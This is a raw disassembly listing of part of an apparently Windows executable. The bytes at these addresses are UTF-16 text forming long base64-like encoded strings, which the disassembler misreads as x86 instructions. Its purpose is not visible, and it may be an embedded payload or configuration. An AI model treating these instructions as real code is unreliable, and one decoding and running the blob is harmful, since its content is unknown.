  40adf3:	00 6b 00             	add    %ch,0x0(%ebx)
  40adf6:	49                   	dec    %ecx
  40adf7:	00 38                	add    %bh,(%eax)
  40adf9:	00 50 00             	add    %dl,0x0(%eax)
  40adfc:	46                   	inc    %esi
  40adfd:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae00:	2f                   	das
  40ae01:	00 51 00             	add    %dl,0x0(%ecx)
  40ae04:	74 00                	je     0x40ae06
  40ae06:	49                   	dec    %ecx
  40ae07:	00 55 00             	add    %dl,0x0(%ebp)
  40ae0a:	59                   	pop    %ecx
  40ae0b:	00 2f                	add    %ch,(%edi)
  40ae0d:	00 6a 00             	add    %ch,0x0(%edx)
  40ae10:	77 00                	ja     0x40ae12
  40ae12:	73 00                	jae    0x40ae14
  40ae14:	77 00                	ja     0x40ae16
  40ae16:	45                   	inc    %ebp
  40ae17:	00 76 00             	add    %dh,0x0(%esi)
  40ae1a:	79 00                	jns    0x40ae1c
  40ae1c:	45                   	inc    %ebp
  40ae1d:	00 55 00             	add    %dl,0x0(%ebp)
  40ae20:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40ae24:	46                   	inc    %esi
  40ae25:	00 48 00             	add    %cl,0x0(%eax)
  40ae28:	54                   	push   %esp
  40ae29:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae2c:	48                   	dec    %eax
  40ae2d:	00 71 00             	add    %dh,0x0(%ecx)
  40ae30:	62 00                	bound  %eax,(%eax)
  40ae32:	43                   	inc    %ebx
  40ae33:	00 71 00             	add    %dh,0x0(%ecx)
  40ae36:	75 00                	jne    0x40ae38
  40ae38:	71 00                	jno    0x40ae3a
  40ae3a:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae3b:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40ae3f:	00 46 00             	add    %al,0x0(%esi)
  40ae42:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40ae46:	59                   	pop    %ecx
  40ae47:	00 58 00             	add    %bl,0x0(%eax)
  40ae4a:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40ae4e:	54                   	push   %esp
  40ae4f:	00 47 00             	add    %al,0x0(%edi)
  40ae52:	65 00 39             	add    %bh,%gs:(%ecx)
  40ae55:	00 78 00             	add    %bh,0x0(%eax)
  40ae58:	72 00                	jb     0x40ae5a
  40ae5a:	56                   	push   %esi
  40ae5b:	00 71 00             	add    %dh,0x0(%ecx)
  40ae5e:	56                   	push   %esi
  40ae5f:	00 59 00             	add    %bl,0x0(%ecx)
  40ae62:	31 00                	xor    %eax,(%eax)
  40ae64:	73 00                	jae    0x40ae66
  40ae66:	58                   	pop    %eax
  40ae67:	00 42 00             	add    %al,0x0(%edx)
  40ae6a:	33 00                	xor    (%eax),%eax
  40ae6c:	77 00                	ja     0x40ae6e
  40ae6e:	4f                   	dec    %edi
  40ae6f:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40ae73:	00 76 00             	add    %dh,0x0(%esi)
  40ae76:	76 00                	jbe    0x40ae78
  40ae78:	68 00 37 00 77       	push   $0x77003700
  40ae7d:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae80:	52                   	push   %edx
  40ae81:	00 31                	add    %dh,(%ecx)
  40ae83:	00 68 00             	add    %ch,0x0(%eax)
  40ae86:	2b 00                	sub    (%eax),%eax
  40ae88:	34 00                	xor    $0x0,%al
  40ae8a:	45                   	inc    %ebp
  40ae8b:	00 55 00             	add    %dl,0x0(%ebp)
  40ae8e:	78 00                	js     0x40ae90
  40ae90:	61                   	popa
  40ae91:	00 72 00             	add    %dh,0x0(%edx)
  40ae94:	4d                   	dec    %ebp
  40ae95:	00 46 00             	add    %al,0x0(%esi)
  40ae98:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ae9c:	61                   	popa
  40ae9d:	00 72 00             	add    %dh,0x0(%edx)
  40aea0:	4a                   	dec    %edx
  40aea1:	00 58 00             	add    %bl,0x0(%eax)
  40aea4:	43                   	inc    %ebx
  40aea5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aea8:	62 00                	bound  %eax,(%eax)
  40aeaa:	42                   	inc    %edx
  40aeab:	00 4e 00             	add    %cl,0x0(%esi)
  40aeae:	49                   	dec    %ecx
  40aeaf:	00 38                	add    %bh,(%eax)
  40aeb1:	00 4e 00             	add    %cl,0x0(%esi)
  40aeb4:	34 00                	xor    $0x0,%al
  40aeb6:	33 00                	xor    (%eax),%eax
  40aeb8:	4b                   	dec    %ebx
  40aeb9:	00 68 00             	add    %ch,0x0(%eax)
  40aebc:	41                   	inc    %ecx
  40aebd:	00 48 00             	add    %cl,0x0(%eax)
  40aec0:	4e                   	dec    %esi
  40aec1:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40aec5:	00 30                	add    %dh,(%eax)
  40aec7:	00 69 00             	add    %ch,0x0(%ecx)
  40aeca:	51                   	push   %ecx
  40aecb:	00 6e 00             	add    %ch,0x0(%esi)
  40aece:	6d                   	insl   (%dx),%es:(%edi)
  40aecf:	00 66 00             	add    %ah,0x0(%esi)
  40aed2:	4f                   	dec    %edi
  40aed3:	00 65 00             	add    %ah,0x0(%ebp)
  40aed6:	50                   	push   %eax
  40aed7:	00 41 00             	add    %al,0x0(%ecx)
  40aeda:	55                   	push   %ebp
  40aedb:	00 41 00             	add    %al,0x0(%ecx)
  40aede:	4a                   	dec    %edx
  40aedf:	00 70 00             	add    %dh,0x0(%eax)
  40aee2:	56                   	push   %esi
  40aee3:	00 30                	add    %dh,(%eax)
  40aee5:	00 37                	add    %dh,(%edi)
  40aee7:	00 44 00 2f          	add    %al,0x2f(%eax,%eax,1)
  40aeeb:	00 35 00 6b 00 73    	add    %dh,0x73006b00
  40aef1:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40aef5:	00 6d 00             	add    %ch,0x0(%ebp)
  40aef8:	52                   	push   %edx
  40aef9:	00 58 00             	add    %bl,0x0(%eax)
  40aefc:	42                   	inc    %edx
  40aefd:	00 62 00             	add    %ah,0x0(%edx)
  40af00:	64 00 33             	add    %dh,%fs:(%ebx)
  40af03:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  40af07:	00 48 00             	add    %cl,0x0(%eax)
  40af0a:	77 00                	ja     0x40af0c
  40af0c:	50                   	push   %eax
  40af0d:	00 4b 00             	add    %cl,0x0(%ebx)
  40af10:	70 00                	jo     0x40af12
  40af12:	45                   	inc    %ebp
  40af13:	00 6f 00             	add    %ch,0x0(%edi)
  40af16:	46                   	inc    %esi
  40af17:	00 68 00             	add    %ch,0x0(%eax)
  40af1a:	6b 00 45             	imul   $0x45,(%eax),%eax
  40af1d:	00 48 00             	add    %cl,0x0(%eax)
  40af20:	32 00                	xor    (%eax),%al
  40af22:	46                   	inc    %esi
  40af23:	00 33                	add    %dh,(%ebx)
  40af25:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af28:	6a 00                	push   $0x0
  40af2a:	63 00                	arpl   %eax,(%eax)
  40af2c:	6d                   	insl   (%dx),%es:(%edi)
  40af2d:	00 6d 00             	add    %ch,0x0(%ebp)
  40af30:	52                   	push   %edx
  40af31:	00 43 00             	add    %al,0x0(%ebx)
  40af34:	49                   	dec    %ecx
  40af35:	00 4b 00             	add    %cl,0x0(%ebx)
  40af38:	77 00                	ja     0x40af3a
  40af3a:	49                   	dec    %ecx
  40af3b:	00 75 00             	add    %dh,0x0(%ebp)
  40af3e:	75 00                	jne    0x40af40
  40af40:	53                   	push   %ebx
  40af41:	00 6d 00             	add    %ch,0x0(%ebp)
  40af44:	31 00                	xor    %eax,(%eax)
  40af46:	72 00                	jb     0x40af48
  40af48:	78 00                	js     0x40af4a
  40af4a:	64 00 36             	add    %dh,%fs:(%esi)
  40af4d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af50:	63 00                	arpl   %eax,(%eax)
  40af52:	2f                   	das
  40af53:	00 55 00             	add    %dl,0x0(%ebp)
  40af56:	2f                   	das
  40af57:	00 67 00             	add    %ah,0x0(%edi)
  40af5a:	33 00                	xor    (%eax),%eax
  40af5c:	76 00                	jbe    0x40af5e
  40af5e:	77 00                	ja     0x40af60
  40af60:	2b 00                	sub    (%eax),%eax
  40af62:	34 00                	xor    $0x0,%al
  40af64:	6f                   	outsl  %ds:(%esi),(%dx)
  40af65:	00 30                	add    %dh,(%eax)
  40af67:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  40af6b:	00 51 00             	add    %dl,0x0(%ecx)
  40af6e:	61                   	popa
  40af6f:	00 46 00             	add    %al,0x0(%esi)
  40af72:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40af76:	61                   	popa
  40af77:	00 77 00             	add    %dh,0x0(%edi)
  40af7a:	61                   	popa
  40af7b:	00 51 00             	add    %dl,0x0(%ecx)
  40af7e:	77 00                	ja     0x40af80
  40af80:	72 00                	jb     0x40af82
  40af82:	61                   	popa
  40af83:	00 4f 00             	add    %cl,0x0(%edi)
  40af86:	4b                   	dec    %ebx
  40af87:	00 4a 00             	add    %cl,0x0(%edx)
  40af8a:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40af8e:	78 00                	js     0x40af90
  40af90:	62 00                	bound  %eax,(%eax)
  40af92:	6e                   	outsb  %ds:(%esi),(%dx)
  40af93:	00 35 00 50 00 72    	add    %dh,0x72005000
  40af99:	00 43 00             	add    %al,0x0(%ebx)
  40af9c:	46                   	inc    %esi
  40af9d:	00 6b 00             	add    %ch,0x0(%ebx)
  40afa0:	55                   	push   %ebp
  40afa1:	00 6c 00 38          	add    %ch,0x38(%eax,%eax,1)
  40afa5:	00 42 00             	add    %al,0x0(%edx)
  40afa8:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40afac:	4c                   	dec    %esp
  40afad:	00 79 00             	add    %bh,0x0(%ecx)
  40afb0:	38 00                	cmp    %al,(%eax)
  40afb2:	74 00                	je     0x40afb4
  40afb4:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40afb8:	72 00                	jb     0x40afba
  40afba:	58                   	pop    %eax
  40afbb:	00 6b 00             	add    %ch,0x0(%ebx)
  40afbe:	33 00                	xor    (%eax),%eax
  40afc0:	4c                   	dec    %esp
  40afc1:	00 6d 00             	add    %ch,0x0(%ebp)
  40afc4:	33 00                	xor    (%eax),%eax
  40afc6:	41                   	inc    %ecx
  40afc7:	00 32                	add    %dh,(%edx)
  40afc9:	00 41 00             	add    %al,0x0(%ecx)
  40afcc:	39 00                	cmp    %eax,(%eax)
  40afce:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  40afd2:	56                   	push   %esi
  40afd3:	00 47 00             	add    %al,0x0(%edi)
  40afd6:	48                   	dec    %eax
  40afd7:	00 6b 00             	add    %ch,0x0(%ebx)
  40afda:	72 00                	jb     0x40afdc
  40afdc:	44                   	inc    %esp
  40afdd:	00 6f 00             	add    %ch,0x0(%edi)
  40afe0:	61                   	popa
  40afe1:	00 56 00             	add    %dl,0x0(%esi)
  40afe4:	5a                   	pop    %edx
  40afe5:	00 4e 00             	add    %cl,0x0(%esi)
  40afe8:	4a                   	dec    %edx
  40afe9:	00 69 00             	add    %ch,0x0(%ecx)
  40afec:	65 00 2b             	add    %ch,%gs:(%ebx)
  40afef:	00 50 00             	add    %dl,0x0(%eax)
  40aff2:	52                   	push   %edx
  40aff3:	00 76 00             	add    %dh,0x0(%esi)
  40aff6:	69 00 47 00 51 00    	imul   $0x510047,(%eax),%eax
  40affc:	4b                   	dec    %ebx
  40affd:	00 79 00             	add    %bh,0x0(%ecx)
  40b000:	49                   	dec    %ecx
  40b001:	00 77 00             	add    %dh,0x0(%edi)
  40b004:	4f                   	dec    %edi
  40b005:	00 4f 00             	add    %cl,0x0(%edi)
  40b008:	34 00                	xor    $0x0,%al
  40b00a:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b00e:	37                   	aaa
  40b00f:	00 2b                	add    %ch,(%ebx)
  40b011:	00 6f 00             	add    %ch,0x0(%edi)
  40b014:	53                   	push   %ebx
  40b015:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40b019:	00 44 00 77          	add    %al,0x77(%eax,%eax,1)
  40b01d:	00 36                	add    %dh,(%esi)
  40b01f:	00 52 00             	add    %dl,0x0(%edx)
  40b022:	63 00                	arpl   %eax,(%eax)
  40b024:	4e                   	dec    %esi
  40b025:	00 4a 00             	add    %cl,0x0(%edx)
  40b028:	79 00                	jns    0x40b02a
  40b02a:	43                   	inc    %ebx
  40b02b:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40b02f:	00 78 00             	add    %bh,0x0(%eax)
  40b032:	46                   	inc    %esi
  40b033:	00 6f 00             	add    %ch,0x0(%edi)
  40b036:	48                   	dec    %eax
  40b037:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40b03b:	00 36                	add    %dh,(%esi)
  40b03d:	00 56 00             	add    %dl,0x0(%esi)
  40b040:	6a 00                	push   $0x0
  40b042:	35 00 63 00 43       	xor    $0x43006300,%eax
  40b047:	00 66 00             	add    %ah,0x0(%esi)
  40b04a:	43                   	inc    %ebx
  40b04b:	00 78 00             	add    %bh,0x0(%eax)
  40b04e:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b052:	39 00                	cmp    %eax,(%eax)
  40b054:	79 00                	jns    0x40b056
  40b056:	6e                   	outsb  %ds:(%esi),(%dx)
  40b057:	00 72 00             	add    %dh,0x0(%edx)
  40b05a:	44                   	inc    %esp
  40b05b:	00 32                	add    %dh,(%edx)
  40b05d:	00 4a 00             	add    %cl,0x0(%edx)
  40b060:	55                   	push   %ebp
  40b061:	00 43 00             	add    %al,0x0(%ebx)
  40b064:	58                   	pop    %eax
  40b065:	00 66 00             	add    %ah,0x0(%esi)
  40b068:	4f                   	dec    %edi
  40b069:	00 58 00             	add    %bl,0x0(%eax)
  40b06c:	2b 00                	sub    (%eax),%eax
  40b06e:	76 00                	jbe    0x40b070
  40b070:	58                   	pop    %eax
  40b071:	00 55 00             	add    %dl,0x0(%ebp)
  40b074:	70 00                	jo     0x40b076
  40b076:	4a                   	dec    %edx
  40b077:	00 6b 00             	add    %ch,0x0(%ebx)
  40b07a:	38 00                	cmp    %al,(%eax)
  40b07c:	33 00                	xor    (%eax),%eax
  40b07e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b07f:	00 53 00             	add    %dl,0x0(%ebx)
  40b082:	49                   	dec    %ecx
  40b083:	00 33                	add    %dh,(%ebx)
  40b085:	00 2b                	add    %ch,(%ebx)
  40b087:	00 35 00 43 00 6d    	add    %dh,0x6d004300
  40b08d:	00 71 00             	add    %dh,0x0(%ecx)
  40b090:	70 00                	jo     0x40b092
  40b092:	64 00 4c 00 4b       	add    %cl,%fs:0x4b(%eax,%eax,1)
  40b097:	00 6b 00             	add    %ch,0x0(%ebx)
  40b09a:	74 00                	je     0x40b09c
  40b09c:	5a                   	pop    %edx
  40b09d:	00 4f 00             	add    %cl,0x0(%edi)
  40b0a0:	65 00 33             	add    %dh,%gs:(%ebx)
  40b0a3:	00 35 00 73 00 4f    	add    %dh,0x4f007300
  40b0a9:	00 36                	add    %dh,(%esi)
  40b0ab:	00 55 00             	add    %dl,0x0(%ebp)
  40b0ae:	4b                   	dec    %ebx
  40b0af:	00 51 00             	add    %dl,0x0(%ecx)
  40b0b2:	62 00                	bound  %eax,(%eax)
  40b0b4:	35 00 76 00 58       	xor    $0x58007600,%eax
  40b0b9:	00 78 00             	add    %bh,0x0(%eax)
  40b0bc:	39 00                	cmp    %eax,(%eax)
  40b0be:	6a 00                	push   $0x0
  40b0c0:	4c                   	dec    %esp
  40b0c1:	00 4f 00             	add    %cl,0x0(%edi)
  40b0c4:	6c                   	insb   (%dx),%es:(%edi)
  40b0c5:	00 51 00             	add    %dl,0x0(%ecx)
  40b0c8:	4b                   	dec    %ebx
  40b0c9:	00 61 00             	add    %ah,0x0(%ecx)
  40b0cc:	38 00                	cmp    %al,(%eax)
  40b0ce:	57                   	push   %edi
  40b0cf:	00 6b 00             	add    %ch,0x0(%ebx)
  40b0d2:	51                   	push   %ecx
  40b0d3:	00 33                	add    %dh,(%ebx)
  40b0d5:	00 67 00             	add    %ah,0x0(%edi)
  40b0d8:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40b0dc:	42                   	inc    %edx
  40b0dd:	00 57 00             	add    %dl,0x0(%edi)
  40b0e0:	48                   	dec    %eax
  40b0e1:	00 42 00             	add    %al,0x0(%edx)
  40b0e4:	2f                   	das
  40b0e5:	00 30                	add    %dh,(%eax)
  40b0e7:	00 76 00             	add    %dh,0x0(%esi)
  40b0ea:	46                   	inc    %esi
  40b0eb:	00 4e 00             	add    %cl,0x0(%esi)
  40b0ee:	63 00                	arpl   %eax,(%eax)
  40b0f0:	52                   	push   %edx
  40b0f1:	00 53 00             	add    %dl,0x0(%ebx)
  40b0f4:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40b0f7:	00 2b                	add    %ch,(%ebx)
  40b0f9:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  40b0fd:	00 68 00             	add    %ch,0x0(%eax)
  40b100:	6c                   	insb   (%dx),%es:(%edi)
  40b101:	00 55 00             	add    %dl,0x0(%ebp)
  40b104:	61                   	popa
  40b105:	00 55 00             	add    %dl,0x0(%ebp)
  40b108:	51                   	push   %ecx
  40b109:	00 52 00             	add    %dl,0x0(%edx)
  40b10c:	41                   	inc    %ecx
  40b10d:	00 57 00             	add    %dl,0x0(%edi)
  40b110:	52                   	push   %edx
  40b111:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  40b115:	00 2b                	add    %ch,(%ebx)
  40b117:	00 77 00             	add    %dh,0x0(%edi)
  40b11a:	47                   	inc    %edi
  40b11b:	00 72 00             	add    %dh,0x0(%edx)
  40b11e:	6c                   	insb   (%dx),%es:(%edi)
  40b11f:	00 49 00             	add    %cl,0x0(%ecx)
  40b122:	42                   	inc    %edx
  40b123:	00 71 00             	add    %dh,0x0(%ecx)
  40b126:	49                   	dec    %ecx
  40b127:	00 5a 00             	add    %bl,0x0(%edx)
  40b12a:	45                   	inc    %ebp
  40b12b:	00 79 00             	add    %bh,0x0(%ecx)
  40b12e:	76 00                	jbe    0x40b130
  40b130:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40b134:	46                   	inc    %esi
  40b135:	00 67 00             	add    %ah,0x0(%edi)
  40b138:	76 00                	jbe    0x40b13a
  40b13a:	54                   	push   %esp
  40b13b:	00 61 00             	add    %ah,0x0(%ecx)
  40b13e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b13f:	00 58 00             	add    %bl,0x0(%eax)
  40b142:	55                   	push   %ebp
  40b143:	00 4f 00             	add    %cl,0x0(%edi)
  40b146:	4c                   	dec    %esp
  40b147:	00 7a 00             	add    %bh,0x0(%edx)
  40b14a:	51                   	push   %ecx
  40b14b:	00 52 00             	add    %dl,0x0(%edx)
  40b14e:	63 00                	arpl   %eax,(%eax)
  40b150:	56                   	push   %esi
  40b151:	00 62 00             	add    %ah,0x0(%edx)
  40b154:	72 00                	jb     0x40b156
  40b156:	6b 00 42             	imul   $0x42,(%eax),%eax
  40b159:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40b15d:	00 75 00             	add    %dh,0x0(%ebp)
  40b160:	45                   	inc    %ebp
  40b161:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40b165:	00 62 00             	add    %ah,0x0(%edx)
  40b168:	45                   	inc    %ebp
  40b169:	00 4a 00             	add    %cl,0x0(%edx)
  40b16c:	50                   	push   %eax
  40b16d:	00 78 00             	add    %bh,0x0(%eax)
  40b170:	68 00 41 00 68       	push   $0x68004100
  40b175:	00 4d 00             	add    %cl,0x0(%ebp)
  40b178:	68 00 59 00 6c       	push   $0x6c005900
  40b17d:	00 4e 00             	add    %cl,0x0(%esi)
  40b180:	48                   	dec    %eax
  40b181:	00 37                	add    %dh,(%edi)
  40b183:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
  40b187:	00 45 00             	add    %al,0x0(%ebp)
  40b18a:	4e                   	dec    %esi
  40b18b:	00 55 00             	add    %dl,0x0(%ebp)
  40b18e:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40b192:	4d                   	dec    %ebp
  40b193:	00 36                	add    %dh,(%esi)
  40b195:	00 4e 00             	add    %cl,0x0(%esi)
  40b198:	75 00                	jne    0x40b19a
  40b19a:	62 00                	bound  %eax,(%eax)
  40b19c:	79 00                	jns    0x40b19e
  40b19e:	73 00                	jae    0x40b1a0
  40b1a0:	45                   	inc    %ebp
  40b1a1:	00 35 00 72 00 48    	add    %dh,0x48007200
  40b1a7:	00 4a 00             	add    %cl,0x0(%edx)
  40b1aa:	41                   	inc    %ecx
  40b1ab:	00 6e 00             	add    %ch,0x0(%esi)
  40b1ae:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1af:	00 57 00             	add    %dl,0x0(%edi)
  40b1b2:	34 00                	xor    $0x0,%al
  40b1b4:	37                   	aaa
  40b1b5:	00 31                	add    %dh,(%ecx)
  40b1b7:	00 51 00             	add    %dl,0x0(%ecx)
  40b1ba:	39 00                	cmp    %eax,(%eax)
  40b1bc:	43                   	inc    %ebx
  40b1bd:	00 7a 00             	add    %bh,0x0(%edx)
  40b1c0:	77 00                	ja     0x40b1c2
  40b1c2:	68 00 41 00 7a       	push   $0x7a004100
  40b1c7:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40b1cb:	00 39                	add    %bh,(%ecx)
  40b1cd:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40b1d1:	00 61 00             	add    %ah,0x0(%ecx)
  40b1d4:	43                   	inc    %ebx
  40b1d5:	00 4a 00             	add    %cl,0x0(%edx)
  40b1d8:	38 00                	cmp    %al,(%eax)
  40b1da:	68 00 74 00 49       	push   $0x49007400
  40b1df:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1e2:	55                   	push   %ebp
  40b1e3:	00 59 00             	add    %bl,0x0(%ecx)
  40b1e6:	51                   	push   %ecx
  40b1e7:	00 62 00             	add    %ah,0x0(%edx)
  40b1ea:	46                   	inc    %esi
  40b1eb:	00 48 00             	add    %cl,0x0(%eax)
  40b1ee:	6c                   	insb   (%dx),%es:(%edi)
  40b1ef:	00 69 00             	add    %ch,0x0(%ecx)
  40b1f2:	4d                   	dec    %ebp
  40b1f3:	00 57 00             	add    %dl,0x0(%edi)
  40b1f6:	71 00                	jno    0x40b1f8
  40b1f8:	4e                   	dec    %esi
  40b1f9:	00 63 00             	add    %ah,0x0(%ebx)
  40b1fc:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  40b200:	77 00                	ja     0x40b202
  40b202:	69 00 35 00 52 00    	imul   $0x520035,(%eax),%eax
  40b208:	55                   	push   %ebp
  40b209:	00 51 00             	add    %dl,0x0(%ecx)
  40b20c:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40b210:	42                   	inc    %edx
  40b211:	00 32                	add    %dh,(%edx)
  40b213:	00 4d 00             	add    %cl,0x0(%ebp)
  40b216:	45                   	inc    %ebp
  40b217:	00 67 00             	add    %ah,0x0(%edi)
  40b21a:	4e                   	dec    %esi
  40b21b:	00 72 00             	add    %dh,0x0(%edx)
  40b21e:	73 00                	jae    0x40b220
  40b220:	71 00                	jno    0x40b222
  40b222:	63 00                	arpl   %eax,(%eax)
  40b224:	46                   	inc    %esi
  40b225:	00 6d 00             	add    %ch,0x0(%ebp)
  40b228:	47                   	inc    %edi
  40b229:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  40b22d:	00 37                	add    %dh,(%edi)
  40b22f:	00 4a 00             	add    %cl,0x0(%edx)
  40b232:	67 00 36 00 4a       	add    %dh,0x4a00
  40b237:	00 6f 00             	add    %ch,0x0(%edi)
  40b23a:	45                   	inc    %ebp
  40b23b:	00 50 00             	add    %dl,0x0(%eax)
  40b23e:	52                   	push   %edx
  40b23f:	00 78 00             	add    %bh,0x0(%eax)
  40b242:	37                   	aaa
  40b243:	00 77 00             	add    %dh,0x0(%edi)
  40b246:	76 00                	jbe    0x40b248
  40b248:	56                   	push   %esi
  40b249:	00 38                	add    %bh,(%eax)
  40b24b:	00 4a 00             	add    %cl,0x0(%edx)
  40b24e:	68 00 77 00 3d       	push   $0x3d007700
  40b253:	00 00                	add    %al,(%eax)
  40b255:	87 b1 47 00 4f 00    	xchg   %esi,0x4f0047(%ecx)
  40b25b:	6c                   	insb   (%dx),%es:(%edi)
  40b25c:	00 53 00             	add    %dl,0x0(%ebx)
  40b25f:	6c                   	insb   (%dx),%es:(%edi)
  40b260:	00 71 00             	add    %dh,0x0(%ecx)
  40b263:	61                   	popa
  40b264:	00 76 00             	add    %dh,0x0(%esi)
  40b267:	59                   	pop    %ecx
  40b268:	00 6b 00             	add    %ch,0x0(%ebx)
  40b26b:	41                   	inc    %ecx
  40b26c:	00 50 00             	add    %dl,0x0(%eax)
  40b26f:	79 00                	jns    0x40b271
  40b271:	6c                   	insb   (%dx),%es:(%edi)
  40b272:	00 46 00             	add    %al,0x0(%esi)
  40b275:	36 00 4d 00          	add    %cl,%ss:0x0(%ebp)
  40b279:	38 00                	cmp    %al,(%eax)
  40b27b:	7a 00                	jp     0x40b27d
  40b27d:	77 00                	ja     0x40b27f
  40b27f:	65 00 54 00 5a       	add    %dl,%gs:0x5a(%eax,%eax,1)
  40b284:	00 46 00             	add    %al,0x0(%esi)
  40b287:	77 00                	ja     0x40b289
  40b289:	38 00                	cmp    %al,(%eax)
  40b28b:	54                   	push   %esp
  40b28c:	00 73 00             	add    %dh,0x0(%ebx)
  40b28f:	34 00                	xor    $0x0,%al
  40b291:	38 00                	cmp    %al,(%eax)
  40b293:	2f                   	das
  40b294:	00 56 00             	add    %dl,0x0(%esi)
  40b297:	69 00 39 00 50 00    	imul   $0x500039,(%eax),%eax
  40b29d:	4b                   	dec    %ebx
  40b29e:	00 67 00             	add    %ah,0x0(%edi)
  40b2a1:	59                   	pop    %ecx
  40b2a2:	00 71 00             	add    %dh,0x0(%ecx)
  40b2a5:	47                   	inc    %edi
  40b2a6:	00 52 00             	add    %dl,0x0(%edx)
  40b2a9:	4f                   	dec    %edi
  40b2aa:	00 42 00             	add    %al,0x0(%edx)
  40b2ad:	78 00                	js     0x40b2af
  40b2af:	7a 00                	jp     0x40b2b1
  40b2b1:	50                   	push   %eax
  40b2b2:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
  40b2b6:	00 5a 00             	add    %bl,0x0(%edx)
  40b2b9:	77 00                	ja     0x40b2bb
  40b2bb:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40b2bf:	4a                   	dec    %edx
  40b2c0:	00 5a 00             	add    %bl,0x0(%edx)
  40b2c3:	68 00 54 00 69       	push   $0x69005400
  40b2c8:	00 39                	add    %bh,(%ecx)
  40b2ca:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  40b2ce:	00 2f                	add    %ch,(%edi)
  40b2d0:	00 2f                	add    %ch,(%edi)
  40b2d2:	00 79 00             	add    %bh,0x0(%ecx)
  40b2d5:	66 00 2b             	data16 add %ch,(%ebx)
  40b2d8:	00 73 00             	add    %dh,0x0(%ebx)
  40b2db:	4d                   	dec    %ebp
  40b2dc:	00 53 00             	add    %dl,0x0(%ebx)
  40b2df:	71 00                	jno    0x40b2e1
  40b2e1:	49                   	dec    %ecx
  40b2e2:	00 2b                	add    %ch,(%ebx)
  40b2e4:	00 6f 00             	add    %ch,0x0(%edi)
  40b2e7:	50                   	push   %eax
  40b2e8:	00 6a 00             	add    %ch,0x0(%edx)
  40b2eb:	76 00                	jbe    0x40b2ed
  40b2ed:	46                   	inc    %esi
  40b2ee:	00 7a 00             	add    %bh,0x0(%edx)
  40b2f1:	64 00 6c 00 4e       	add    %ch,%fs:0x4e(%eax,%eax,1)
  40b2f6:	00 39                	add    %bh,(%ecx)
  40b2f8:	00 30                	add    %dh,(%eax)
  40b2fa:	00 58 00             	add    %bl,0x0(%eax)
  40b2fd:	79 00                	jns    0x40b2ff
  40b2ff:	34 00                	xor    $0x0,%al
  40b301:	51                   	push   %ecx
  40b302:	00 4a 00             	add    %cl,0x0(%edx)
  40b305:	6d                   	insl   (%dx),%es:(%edi)
  40b306:	00 4f 00             	add    %cl,0x0(%edi)
  40b309:	58                   	pop    %eax
  40b30a:	00 53 00             	add    %dl,0x0(%ebx)
  40b30d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b30e:	00 31                	add    %dh,(%ecx)
  40b310:	00 61 00             	add    %ah,0x0(%ecx)
  40b313:	6c                   	insb   (%dx),%es:(%edi)
  40b314:	00 72 00             	add    %dh,0x0(%edx)
  40b317:	52                   	push   %edx
  40b318:	00 4c 00 48          	add    %cl,0x48(%eax,%eax,1)
  40b31c:	00 50 00             	add    %dl,0x0(%eax)
  40b31f:	30 00                	xor    %al,(%eax)
  40b321:	44                   	inc    %esp
  40b322:	00 2b                	add    %ch,(%ebx)
  40b324:	00 69 00             	add    %ch,0x0(%ecx)
  40b327:	78 00                	js     0x40b329
  40b329:	70 00                	jo     0x40b32b
  40b32b:	30 00                	xor    %al,(%eax)
  40b32d:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b331:	69 00 49 00 6c 00    	imul   $0x6c0049,(%eax),%eax
  40b337:	63 00                	arpl   %eax,(%eax)
  40b339:	72 00                	jb     0x40b33b
  40b33b:	4e                   	dec    %esi
  40b33c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b33f:	75 00                	jne    0x40b341
  40b341:	46                   	inc    %esi
  40b342:	00 32                	add    %dh,(%edx)
